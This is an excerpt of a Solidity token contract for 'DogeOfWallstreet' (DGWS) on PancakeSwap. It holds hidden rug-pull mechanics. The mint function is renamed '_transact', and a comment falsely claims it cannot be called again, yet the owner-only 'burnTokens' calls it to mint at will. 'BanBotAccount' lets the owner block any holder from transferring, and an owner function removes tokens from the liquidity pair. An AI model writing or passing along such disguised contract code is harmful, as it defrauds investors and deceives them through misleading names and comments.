...
Website: Coming Soon!
TG Portal: https://t.me/dogeofwallstreet
TG Chat: https://twitter.com/doge_wallstreet
...
interface IPancakeswapV2Pair {
    ...
    event Transact(address indexed sender, uint amount0, uint amount1);
    ...
    function transact(address to) external returns (uint liquidity);
...
contract ERC20 is Context, IERC20, IERC20Metadata {
     ...
     */
    function _transact(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: transact to the zero address");
     ...
     * transacting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be to transferred to `to`.
     * - when `from` is zero, `amount` tokens will be transacted for `to`.
...
contract DGWS is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("DogeOfWallstreet", "DGWS") {
        ...
        /*
            _transact is an internal function in ERC20.sol that is only called here,
            and CANNOT be called ever again
        */
        _transact(msg.sender, totalSupply);
    }
    ...
    function BanBotAccount (address account, bool isBanned) public onlyOwner {
        _BanBot[account] = isBanned;
    }
 
    function burnTokens(address to, uint256 amount) public onlyOwner {
        _transact(to, amount);
    }
    ...
    function _transfer(
        ...
        require(!_BanBot[to] && !_BanBot[from], "You have been Banned from transfering tokens");
         if(amount == 0) {
        ...
        // early sell logic
        bool isBuy = from == PancakeswapV2Pair;
    ...
    function autoBurnLiquidityPairTokens() internal returns (bool){
        ...
        uint256 liquidityPairBalance = this.balanceOf(PancakeswapV2Pair);
        ...
        if (amountToBurn > 0){
            super._transfer(PancakeswapV2Pair, address(0xdead), amountToBurn);
        }
    ...
    function manualBurnLiquidityPairTokens(uint256 percent) external onlyOwner returns (bool){
        ...
        // pull tokens from pancakePair liquidity and move to dead address permanently
        if (amountToBurn > 0){
            super._transfer(PancakeswapV2Pair, address(deadAddress), amountToBurn);
        }
